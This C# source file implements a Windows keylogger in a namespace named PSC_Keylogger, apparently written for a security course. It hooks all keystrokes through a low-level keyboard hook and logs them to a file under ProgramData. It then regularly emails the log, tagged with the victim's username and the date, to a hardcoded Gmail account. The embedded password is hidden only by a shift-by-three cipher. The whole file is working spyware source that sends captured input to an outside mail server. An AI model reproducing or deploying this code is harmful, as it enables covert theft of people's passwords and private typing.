using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace PSC_Keylogger
{
    public static class BaseKeylogger
    {
        private const string FROM_EMAIL_ADDRESS = "protocoalesecuritate01@gmail.com";
        private const string FROM_EMAIL_PASSWORD = "surwrfrdohghvhfxulwdwhlqfrpxqlfdwll";
        private const string TO_EMAIL_ADDRESS = "protocoalesecuritate01@gmail.com";

        private const string LOG_FILE_NAME = @"C:\ProgramData\Z_PSC\mylog.txt";
        private const string ARCHIVE_FILE_NAME = @"C:\ProgramData\Z_PSC\mylog_archive.txt";
        private const bool INCLUDE_LOG_AS_ATTACHMENT = true;

        private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 50;
        private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 0;

        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        public static IntPtr hook = IntPtr.Zero;
        public static LowLevelKeyboardProc llkProcedure = HookCallback;

        private static string buffer = "";

        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {

            if (buffer.Length >= MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG)
            {
                StreamWriter output = new StreamWriter(LOG_FILE_NAME, true);
                output.Write(buffer);
                output.Close();
                buffer = "";
            }

            FileInfo logFile = new FileInfo(LOG_FILE_NAME);

            if (logFile.Exists && logFile.Length >= MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL)
            {
                try
                {
                    logFile.CopyTo(ARCHIVE_FILE_NAME, true);

                    logFile.Delete();

                    System.Threading.Thread mailThread = new System.Threading.Thread(sendMail);
                    mailThread.Start();
                }
                catch (Exception e)
                {
                    Console.Out.WriteLine(e.Message);
                }
            }

            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string strCode = ((Keys)vkCode).ToString();
                switch (strCode)
                {
                    case "OemPeriod":
                        buffer += ".";
                        break;
                    case "Oemcomma":
                        buffer += ",";
                        break;
                    case "Space":
                        buffer += " ";
                        break;
                    case "Enter":
                    case "Return":
                        buffer += "\n";
                        break;
                    case "LShiftKey": case "RShiftKey":
                    case "LControlKey": case "RControlKey":
                    case "Tab": case "Back":
                        buffer += "";
                        break;
                    default:
                        buffer += strCode;
                        break;
                }
            }

            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        public static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        private static void sendMail()
        {
            try
            {
                StreamReader input = new StreamReader(ARCHIVE_FILE_NAME);
                string emailBody = input.ReadToEnd();
                input.Close();

                SmtpClient client = new SmtpClient("smtp.gmail.com")
                {
                    Port = 587,
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential(FROM_EMAIL_ADDRESS, DecryptPassword()),
                    EnableSsl = true,
                };

                MailMessage message = new MailMessage
                {
                    From = new MailAddress(FROM_EMAIL_ADDRESS),
                    Subject = Environment.UserName + " - " + DateTime.Now.Month + "." + DateTime.Now.Day + "." + DateTime.Now.Year,
                    Body = emailBody,
                    IsBodyHtml = false,
                };

                if (INCLUDE_LOG_AS_ATTACHMENT)
                {
                    Attachment attachment = new Attachment(ARCHIVE_FILE_NAME, System.Net.Mime.MediaTypeNames.Text.Plain);
                    message.Attachments.Add(attachment);
                }

                message.To.Add(TO_EMAIL_ADDRESS);

                client.Send(message);

                message.Dispose();
            }
            catch (Exception e)
            {
                Console.Out.WriteLine(e.Message);
            }
        }

        private static string DecryptPassword()
        {
            byte[] values = Encoding.ASCII.GetBytes(FROM_EMAIL_PASSWORD);
            byte[] newValues = new byte[values.Length];

            int index = 0;
            foreach (byte b in values)
            {
                int newValue = b - 3;
                newValues[index] = (byte)newValue;
                index += 1;
            }

            string actualPass = Encoding.ASCII.GetString(newValues);
            return actualPass;
        }

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);
    }
}
